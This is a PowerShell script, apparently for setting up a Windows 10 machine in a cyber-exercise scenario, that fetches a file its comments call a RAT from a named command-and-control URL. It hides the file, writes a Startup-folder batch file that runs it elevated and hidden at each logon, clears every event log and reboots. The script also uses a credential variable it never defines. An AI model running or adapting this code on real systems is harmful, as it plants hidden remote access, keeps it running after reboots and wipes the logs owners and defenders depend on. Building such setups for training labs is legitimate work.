### Preview (20210429 - CyberControl CISO51 Day of Fun)
#
# Not using domain, simple singlevm environment

### Basic non-Parameterized ps1 script to allow introduction of various limited-provisioning commands to Windows 10
param(
  [String]$defAdminUsr, 
  [String]$defAdminPwd,
  [string]$localpath,
  [String]$hostname
)

### Still missing in current build
#   Condition the following functions: Domain add, Computer rename, PSCredential creation, RAT addons, Evaluation rearm
#
###

# Static URLs to download RAT and static download locat
# CAUTION - C2 HUB MOST BE ONLINE AS THIS IS A STATIC DOWNLOAD OPERATION! <to be adjusted in future updates>
$raturl = "http://north2.hub.envar.io/vault76kg/drvfrw.exe"
# For C51 additional evidence file was provided by CC - downloading to D:\
$evidenceurl = "http://north2.hub.envar.io/vault76kg/20210429C51EVIDENCE.zip"
$startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.bat"


# Define PSCredential variables following input from arguments (Domain and Local)
$temppwd = ConvertTo-SecureString -String $defAdminPwd -AsPlainText -Force
$localcred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $defAdminUsr,$temppwd

# Download RAT to argument specified location and hide the file with attributes
Invoke-WebRequest -uri $raturl -OutFile $localpath

$hideFile = get-item $localpath -Force
$hideFile.attributes = "Hidden"

# Download EVIDENCE to Temporary Storage
New-Item -Path 'D:\EvidenceFiles' -ItemType Directory
Invoke-WebRequest -uri $evidenceurl -OutFile 'D:\evidence.zip'
expand-archive -path 'D:\evidence.zip' -destinationpath 'D:\EvidenceFiles'
Remove-Item 'D:\evidence.zip'

# Add a startup script (BAT) to make sure RAT is run by the logging user
add-content $startup "@echo off"
add-content $startup "powershell -c start -verb runas $localpath -windowstyle hidden" 
add-content $startup "echo $hostname"

# Rename the computer according to the Arguments
rename-computer -newname $hostname -force -PassThru -ErrorAction Stop -DomainCredential $domaincred

Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
wevtutil el | Foreach-Object {wevtutil cl $_} -ErrorAction SilentlyContinue

shutdown /r /t 03
